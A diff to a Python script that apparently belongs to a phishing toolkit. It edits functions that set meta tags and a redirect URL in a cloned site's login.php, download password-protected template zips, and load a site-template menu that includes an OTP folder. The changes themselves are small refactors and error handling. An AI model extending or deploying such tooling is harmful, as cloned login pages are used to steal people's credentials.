@@ -721,7 +721,7 @@ def write_meta(url):
         if metaurl=="":
             break
         elif metaurl == "help":
-            print(shadow_help)
+            sprint(shadow_help)
         else:
             allmeta = get_meta(metaurl)
             if allmeta=="":
@@ -742,20 +742,22 @@ def write_redirect():
             sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
             break
         if redirect_url == "help":
-            print(shadow_help)
+            sprint(shadow_help)
 
 # Add more templates from zipfile from url
 def add_zip():
     while True:
         zip_url = input(f"\n{ask}Enter the download url of zipfile: ")
         if zip_url is None or zip_url == "":
-            continue
+            sprint(f"\n{error}No URL specified!")
+            break
         elif zip_url=="help":
-            print(zip_help)
+            sprint(zip_help)
         else:
             download(zip_url, "sites.zip")
             pwd = input(f"\n{ask}Enter the password of zipfile: ")
             extract("sites.zip", sites_dir, pwd)
+            remove("sites.zip")
             break
 
 # Polite Exit
@@ -1182,17 +1184,17 @@ def main_menu():
         command = ts_commands[troubleshoot]
         shell(command)
         pexit()
-    tempdata = cat(templates_file)
-    if is_json(tempdata):
-        sites = parse(tempdata)
-    else:
-        sprint(f"\n{error}templates.json file is corrupted!")
-        exit(1)
-    customdir = None
-    otp_folder = ""
-    names = [site["name"] for site in sites]
-    choices = [str(i) for i in range(1,len(sites)+1)]
     while True:
+        tempdata = cat(templates_file)
+        if is_json(tempdata):
+            sites = parse(tempdata)
+        else:
+            sprint(f"\n{error}templates.json file is corrupted!")
+            exit(1)
+        customdir = None
+        otp_folder = ""
+        names = [site["name"] for site in sites]
+        choices = [str(i) for i in range(1,len(sites)+1)]
         clear(lol=True)
         show_options(names)
         if option is not None:
